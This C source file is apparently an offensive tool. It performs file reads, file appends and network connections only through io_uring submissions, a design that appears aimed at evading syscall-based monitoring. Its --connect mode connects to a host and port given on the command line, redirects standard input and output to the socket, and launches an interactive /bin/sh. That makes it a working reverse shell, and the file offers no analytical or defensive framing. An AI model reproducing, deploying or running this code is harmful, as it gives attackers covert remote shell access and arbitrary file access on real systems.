#define _GNU_SOURCE
#include <linux/io_uring.h>
#include <sys/mman.h>
#include <sys/syscall.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <string.h>
#include <errno.h>
#include <fcntl.h>
#include <unistd.h>

#include "../io_uring/iouring_utils.h"

#define BUFSZ (256 * 1024)

static int uring_open(struct uring *u, const char *path, int flags)
{
    struct io_uring_sqe *sqe = uring_get_sqe(u);
    struct io_uring_cqe cqe;
    sqe->opcode     = IORING_OP_OPENAT;
    sqe->fd         = AT_FDCWD;
    sqe->addr       = (uint64_t)(uintptr_t)path;
    sqe->open_flags = (uint32_t)flags;
    sqe->len        = 0644;
    uring_submit_wait(u, 1); uring_peek_cqe(u, &cqe);
    return (int)cqe.res;
}

static ssize_t uring_read_all(struct uring *u, int fd, char *buf, size_t n)
{
    struct io_uring_sqe *sqe = uring_get_sqe(u);
    struct io_uring_cqe cqe;
    sqe->opcode = IORING_OP_READ; sqe->fd = fd;
    sqe->addr   = (uint64_t)(uintptr_t)buf;
    sqe->len    = (uint32_t)(n-1); sqe->off = 0;
    uring_submit_wait(u, 1); uring_peek_cqe(u, &cqe);
    if ((ssize_t)cqe.res > 0) buf[cqe.res] = '\0';
    return (ssize_t)cqe.res;
}

static ssize_t uring_write_all(struct uring *u, int fd, const char *buf, size_t n)
{
    struct io_uring_sqe *sqe = uring_get_sqe(u);
    struct io_uring_cqe cqe;
    sqe->opcode = IORING_OP_WRITE; sqe->fd = fd;
    sqe->addr   = (uint64_t)(uintptr_t)buf; sqe->len = (uint32_t)n; sqe->off = 0;
    uring_submit_wait(u, 1); uring_peek_cqe(u, &cqe);
    return (ssize_t)cqe.res;
}

static void uring_close(struct uring *u, int fd)
{
    struct io_uring_sqe *sqe = uring_get_sqe(u);
    struct io_uring_cqe cqe;
    sqe->opcode = IORING_OP_CLOSE; sqe->fd = fd;
    uring_submit_wait(u, 1); uring_peek_cqe(u, &cqe);
}

static void do_read(const char *path)
{
    struct uring u = {}; if (uring_init(&u, 8) < 0) return;
    int fd = uring_open(&u, path, O_RDONLY);
    if (fd < 0) { fprintf(stderr, "open: %d\n", fd); uring_free(&u); return; }
    char *buf = malloc(BUFSZ);
    ssize_t n = uring_read_all(&u, fd, buf, BUFSZ);
    if (n > 0) fwrite(buf, 1, (size_t)n, stdout);
    free(buf); uring_close(&u, fd); uring_free(&u);
}

static void do_write(const char *path, const char *data)
{
    struct uring u = {}; if (uring_init(&u, 8) < 0) return;
    int fd = uring_open(&u, path, O_WRONLY|O_CREAT|O_APPEND);
    if (fd < 0) { fprintf(stderr, "open: %d\n", fd); uring_free(&u); return; }
    ssize_t n = uring_write_all(&u, fd, data, strlen(data));
    fprintf(stderr, "[*] %zd bytes\n", n);
    uring_close(&u, fd); uring_free(&u);
}

static void do_connect(const char *host, uint16_t port)
{
    struct uring u = {}; if (uring_init(&u, 16) < 0) return;

    struct io_uring_sqe *sqe;
    struct io_uring_cqe cqe;

    sqe = uring_get_sqe(&u);
    sqe->opcode = IORING_OP_SOCKET;
    sqe->fd     = AF_INET;
    sqe->off    = SOCK_STREAM;
    sqe->len    = 0;
    uring_submit_wait(&u, 1); uring_peek_cqe(&u, &cqe);
    if ((int)cqe.res < 0) {
        fprintf(stderr, "SOCKET: %d\n", cqe.res); uring_free(&u); return;
    }
    int sockfd = (int)cqe.res;

    struct sockaddr_in sa = {};
    sa.sin_family = AF_INET; sa.sin_port = htons(port);
    if (inet_pton(AF_INET, host, &sa.sin_addr) <= 0) {
        close(sockfd); uring_free(&u); return;
    }
    sqe = uring_get_sqe(&u);
    sqe->opcode   = IORING_OP_CONNECT;
    sqe->fd       = sockfd;
    sqe->addr     = (uint64_t)(uintptr_t)&sa;
    sqe->off      = sizeof(sa);
    uring_submit_wait(&u, 1); uring_peek_cqe(&u, &cqe);
    if ((int)cqe.res < 0) {
        fprintf(stderr, "CONNECT: %d\n", cqe.res);
        close(sockfd); uring_free(&u); return;
    }

    fprintf(stderr, "[*] connected %s:%u fd=%d\n", host, port, sockfd);
    uring_free(&u);

    dup2(sockfd, 0); dup2(sockfd, 1); dup2(sockfd, 2); close(sockfd);
    setsid();
    char *sh[] = { "/bin/sh", "-i", NULL };
    execve("/bin/sh", sh, environ);
    perror("execve");
}

int main(int argc, char *argv[])
{
    if (argc < 3) {
        fprintf(stderr, "usage: %s <--read|--write|--connect>\n", argv[0]);
        return 1;
    }
    if (!strcmp(argv[1],"--read"))                       { do_read(argv[2]); return 0; }
    if (!strcmp(argv[1],"--write") && argc>=4)           { do_write(argv[2], argv[3]); return 0; }
    if (!strcmp(argv[1],"--connect") && argc>=4)         { do_connect(argv[2],(uint16_t)atoi(argv[3])); return 0; }
    return 1;
}
